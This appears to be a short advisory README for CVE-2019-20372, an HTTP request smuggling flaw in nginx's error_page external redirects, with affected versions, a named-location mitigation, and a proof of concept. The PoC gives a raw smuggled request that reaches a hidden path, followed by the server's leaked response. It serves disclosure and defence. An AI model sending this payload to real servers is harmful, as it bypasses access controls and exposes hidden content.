# CVE-2019-20372

Allow HTTP Request Smuggling when redirect to an external site using `error_page` directive in nginx.

Affected configuration is as follows

```nginx
error_page 403 https://error.example.com/403.htm;
error_page 404 https://error.example.com/404.htm;
```

Other configuration of the `error_page` are NOT affected.

```nginx
error_page 404 /404.html;
error_page 404 @404;
```

## Affected Version

nginx

- 1.8.1
- 1.9.5
- 1.14.1
- 1.14.2
- 1.15.9
- 1.16.1
- 1.17.6

## Mitigation

Use a named location instead of having the error_page handler do the redirect.

```nginx
server {
  listen 80;
  server_name localhost;
  error_page 401 @401;

  location / {
    return 401;
  }

  location @401 {
    return 302 http://error.example.org;
  }
}
```

## PoC

```shell
$ docker run -it --rm -p 80:80 -v (pwd)/default.conf:/etc/nginx/conf.d/default.conf nginx:1.17.6
```

### Request

```
GET /a HTTP/1.1
Host: localhost
Content-Length: 56

GET /_hidden/index.html HTTP/1.1
Host: notlocalhost


```

### Response

```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.17.6
Date: Tue, 14 Jan 2020 02:26:14 GMT
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: http://example.org

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.17.6</center>
</body>
</html>
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Tue, 14 Jan 2020 02:26:14 GMT
Content-Type: text/html
Content-Length: 22
Connection: keep-alive

This should be hidden!
```

## References

- https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20372
